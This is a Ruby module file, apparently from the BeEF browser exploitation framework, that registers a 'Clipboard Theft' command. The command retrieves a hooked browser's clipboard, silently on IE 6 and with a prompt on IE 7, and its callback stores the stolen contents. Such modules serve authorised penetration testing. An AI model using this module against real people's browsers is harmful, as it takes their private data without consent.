#
#   Copyright 2011 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
class Clipboard_theft < BeEF::Core::Command
  
  def initialize
    super({
      'Name' => 'Clipboard Theft',
      'Description' => 'Retrieves the clipboard contents. This module will work automatically with Internet Explorer 6.x however Internet Explorer 7.x will prompt the user and ask for permission to access the clipboard.',
      'Category' => 'Misc',
      'Author' => 'bcoles',
      'File' => __FILE__
    })
    
    set_target({
      'verified_status' => VERIFIED_WORKING,
      'browser_name' => IE,
      'browser_max_ver' => "6",
      'browser_min_ver' => "6"
    })
    set_target({
      'verified_status' => VERIFIED_USER_NOTIFY,
      'browser_name' => IE,
      'browser_max_ver' => "7",
      'browser_min_ver' => "7"
    })
    set_target({
      'verified_status' => VERIFIED_NOT_WORKING,
      'browser_name' => ALL
    })

    use_template!
  end
  
  def callback
    content = {}
    content['clipboard'] = @datastore['clipboard']
    save content
  end
  
end
